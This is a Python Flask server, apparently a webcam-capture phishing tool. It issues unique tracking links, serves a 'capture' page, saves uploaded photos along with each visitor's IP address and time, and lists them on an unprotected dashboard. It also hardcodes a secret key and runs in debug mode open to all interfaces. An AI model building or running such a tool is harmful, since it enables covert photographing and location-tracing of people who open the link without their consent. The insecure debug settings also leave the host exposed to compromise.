import os
import uuid
from flask import Flask, render_template, request, redirect, url_for, send_from_directory
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'cyber_secret_key_2024'
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# قاعدة بيانات بسيطة (JSON) لتخزين الروابط والصور
DB_FILE = 'data.json'

def load_db():
    if not os.path.exists(DB_FILE):
        return []
    with open(DB_FILE, 'r') as f:
        try:
            return json.load(f)
        except:
            return []

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

@app.route('/')
def index():
    # توليد رابط فريد لكل جلسة
    link_id = str(uuid.uuid4())[:8]
    # حفظ الرابط في قاعدة البيانات
    db_data = load_db()
    # إذا كان الرابط جديداً، نضيفه
    existing = [d for d in db_data if d['link_id'] == link_id]
    if not existing:
        db_data.append({'link_id': link_id, 'status': 'pending', 'images': []})
        save_db(db_data)
    
    return render_template('capture.html', link_id=link_id)

@app.route('/upload/<link_id>', methods=['POST'])
def upload_photo(link_id):
    if 'file' not in request.files:
        return {'status': 'error'}, 400
    
    file = request.files['file']
    filename = f"{link_id}_{uuid.uuid4().hex}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    
    # تحديث قاعدة البيانات
    db_data = load_db()
    for entry in db_data:
        if entry['link_id'] == link_id:
            entry['images'].append({
                'filename': filename,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': request.remote_addr
            })
            break
    save_db(db_data)
    
    return {'status': 'success'}

@app.route('/dashboard')
def dashboard():
    db_data = load_db()
    # ترتيب حسب الأحدث
    db_data.sort(key=lambda x: len(x['images']), reverse=True)
    return render_template('dashboard.html', data=db_data)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
